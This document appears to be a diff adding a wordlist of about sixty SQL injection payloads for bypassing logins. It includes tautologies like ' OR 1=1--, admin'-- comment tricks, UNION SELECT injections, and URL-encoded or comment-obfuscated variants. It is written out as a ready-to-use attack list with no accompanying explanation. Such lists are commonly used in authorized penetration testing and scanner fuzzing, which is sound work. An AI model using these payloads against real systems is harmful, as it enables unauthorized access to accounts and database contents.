@@ -1,0 +1,61 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+') OR ('1'='1
+') OR ('1'='1'--
+')) OR (('1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1-- -
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+' OR 'x'='x
+" OR "x"="x
+admin'--
+admin' --
+admin'/*
+admin'#
+admin' OR '1'='1
+admin' OR 1=1--
+admin' OR 1=1#
+' OR 1--
+') OR 1--
+' OR 'unusual'='unusual'
+') OR ('unusual'='unusual
+1' OR '1'='1
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+1' OR 1=1--
+1' OR 1=1#
+a' OR 1=1--
+a' OR 'a'='a
+" OR 1=1 AND "1"="1
+x' AND 1=0 UNION SELECT 'x','x
+x' AND 1=0 UNION SELECT 'admin','admin
+' AND 1=0 UNION SELECT 1,1,1,1--
+anything' OR 'x'='x
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+' OR '1'='1' LIMIT 1--
+'='' OR ''='
+'='' OR '
+' or 1=1 or '1'='1
+\' OR 1=1--
+\" OR 1=1--
+%27 OR 1=1--
+%27 OR '1'='1
+' OR username IS NOT NULL OR username = '
+1 OR 1=1#
+1 OR 1=1-- -
+admin'/**/OR/**/1=1--
+admin'%20OR%201=1--
+admin'%0aOR%0a1=1--
+admin' OR/**/1=1--
+' OR 1=1 AND ''='
+' OR 1 LIKE 1--
+' OR name LIKE '%admin%'--
+admin'; SELECT 1-- 
